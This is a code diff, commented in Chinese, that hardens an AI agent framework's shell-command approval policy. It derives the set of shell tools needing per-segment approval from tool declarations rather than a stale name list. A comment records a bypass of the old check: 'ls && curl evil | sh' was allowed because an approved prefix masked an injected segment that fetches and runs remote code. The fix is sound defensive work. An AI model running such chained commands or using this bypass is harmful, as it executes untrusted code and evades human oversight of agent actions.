@@ -124,14 +124,35 @@ class GovernanceDecision(str, Enum):
 # P0-6 分段审批适用面：shell 方言工具。run_code 的 code 是 Python/脚本
 # 本体（|、;、&& 是代码语法而非 shell 连接符），分段会造成合法代码误入
 # 审批——非 shell 工具保持整串白名单/内容检测旧行为。
-_SEGMENTED_SHELL_TOOLS = frozenset({
-    "shell",
-    "computer_shell",
-    "execute_cli_tool",
-    "process",
-    "terminal",
-    "bash",
-})
+#
+# 成员资格=**内置侧读工具自己的声明**（`shell_dialect`）∪ **外部注册面**的别名。
+# 此前是一份手写名字表，成员从未与真实工具面对过账：`exec_command`（P0-3 会话式
+# shell，执行体用 `shell=True`）与 `computer_ssh_exec`（远端 shell）都不在表里 ⇒
+# 「白名单前缀 + 注入段」被整串前缀匹配直接放行（实测 `ls && curl evil | sh` → allow）。
+# 名单里另有 `process` / `terminal` / `execute_cli_tool` 三个名字，在全仓注册处为 0
+# （`execute_cli_tool` 只是方法名，不是工具名）——与并行轴那份旧名单里被逮住的
+# 两个幻名同型（判据见 tests/unit/tools/test_tool_batch_parallelism.py）。
+# 今按教义第 5/6 条一并处置：内置成员读声明，外部面显式登记，幻名删净。
+# 非内置的裁决调用名（**不是**注册工具，故不适用"幻名"判据）：
+# · `shell` —— `GovernancePolicy.evaluate()` 的默认 `tool_name`（裸调用面，如
+#   脚本/API 直接送命令文本）。删掉它等于让默认调用路径失去分段保护；
+# · `bash` —— `shell` 的同义包装名（`approval_manager._WRAPPER_EXECUTABLES`
+#   里正是这些名字），以包装器名义送进裁决的命令同样含 shell 连接符。
+# 台账不是自由文本：集合必须**恰等于**这两个名字，且必须含 `evaluate()` 的默认名
+# ——由 test_command_segment_approval 的 test_externalAliasesArePinned 复算。
+_EXTERNAL_SHELL_ALIASES = frozenset({"shell", "bash"})
+
+
+def listSegmentedShellTools() -> frozenset:
+    """分段审批面的成员集合：内置声明 ∪ 外部注册面别名。
+
+    取数走**唯一来源**——内置侧问各工具自己的 `shell_dialect` 声明
+    （`builtin_tools.listShellDialectTools`），外部注册面走本模块的别名登记。
+    两侧都从本函数读，不在调用点各持一份名单。
+    """
+    from neurova.builtin_tools import listShellDialectTools
+
+    return frozenset(listShellDialectTools()) | _EXTERNAL_SHELL_ALIASES
 
 
 @dataclass
@@ -271,7 +292,9 @@ class GovernancePolicy:
 
         segs = (
             parse_command_segments(command)
-            if command and (tool_name in _SEGMENTED_SHELL_TOOLS or tool_name.startswith("mcp."))
+            if command and (
+                tool_name in listSegmentedShellTools() or tool_name.startswith("mcp.")
+            )
             else []
         )
         is_multi_seg = len(segs) > 1
